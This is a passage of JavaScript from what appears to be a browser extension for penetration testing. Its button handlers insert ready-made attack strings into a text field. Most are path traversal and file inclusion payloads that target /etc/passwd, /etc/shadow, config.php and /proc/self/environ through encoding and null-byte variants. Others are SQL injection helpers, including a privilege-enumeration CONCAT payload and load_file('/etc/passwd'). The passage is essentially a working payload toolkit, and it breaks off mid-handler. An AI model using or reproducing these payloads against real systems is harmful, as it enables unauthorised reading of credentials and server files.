				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/../../../../../../../../../../etc/passwd^^%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrno').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/../../../../../../../../../../etc/shadow^^%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../../../../etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnth').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/./././././././././././etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/./././././././././././etc/shadow%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/./././././././././././etc/group%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '........etcpasswd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnsvn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/%00//%00//%00//%00//%00/etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrngt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/%00//%00//%00//%00//%00/etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptrnnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/%00//%00//%00//%00//%00//etc//shadow%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/%2e%2e../%2e%2e../%2e%2e../%2e%2e../%2e%2e../%2e%2e../etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftntw').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnth').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%5c..%5c..%5c..%5c..%5c..%5c../etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%5c..%5c..%5c..%5c..%5c..%5c../etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cshadow%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..//..//..//..//..//config.php%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../config.php%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnsvn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%5c..%5c..%5c..%5c..%5c..%5c..%5config.php%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftngt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%25%35%63..%25%35%63..%25%35%63config.php%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptftnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '///proc/self/environ';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#lfiptftnff').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../proc/self/environ';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});




	$('#base64').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var enc='';
				var enc = window.btoa(str);
			    
			    var update = remaining_start+enc+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+enc.length;
 //				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#urlencode').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var enc='';
				var enc = encodeURI(str);
			    
			    var update = remaining_start+enc+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+enc.length;
//				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);
			
 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#urldecode').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var dec='';
				var dec = decodeURI(str);
			    
			    var update = remaining_start+dec+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+dec.length;
//				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#base64decode').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var dec='';
				var dec = window.atob(str);
			    
			    var update = remaining_start+dec+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+dec.length;
//				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#utf8').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = 'CONVERT('+str+' USING utf8)'; 
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
//				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);


 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#latin1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}


				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = 'CONVERT('+str+' USING latin1)'; 
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata="+update;

				var end_selection_after = start+final1.length;
//				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#mysqlchar').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var ascii='';

			    for(var i=0;i<str.length;i++) { 
			    	if(i == str.length-1)
			    	{
				        ascii += ""+str.charCodeAt(i)+"";
			    	}
			    	else
			    	{
				        ascii += ""+str.charCodeAt(i)+", ";
			    	}
			    }
   
   				var final1 = 'CHAR('+ascii+')';
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
//				document.cookie="mydata=";
		});
	});

	$('#mssqlchar').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var ascii='';
				var final1 = '';

			    for(var i=0;i<str.length;i++) {
			    	ascii = str.charCodeAt(i);
			    	
			    	if(i == str.length-1)
			    	{
		   				final1 += 'CHAR('+ascii+')';			    
				    }
			    	else
			    	{
		   				final1 += 'CHAR('+ascii+')+';
			    	}
	   				
			    }
   

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#oraclechar').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var ascii='';
				var final1 = '';

			    for(var i=0;i<str.length;i++) {
			    	ascii = str.charCodeAt(i);
			    	
			    	if(i == str.length-1)
			    	{
		   				final1 += 'CHAR('+ascii+')';			    
				    }
			    	else
			    	{
		   				final1 += ' CHAR('+ascii+') ||';
			    	}
	   				
			    }
   
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#filepriv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'CONCAT(0x44617461646972203a,@@datadir,0x3c62723e43757272656e742055736572203a,user(),0x3c62723e3c68723e,(SELECT+GROUP_CONCAT(user,0x3a,file_priv+SEPARATOR+0x3c62723e)+FROM+mysql.user))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#loadfile').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'load_file("/etc/passwd")';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#intooutfile').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
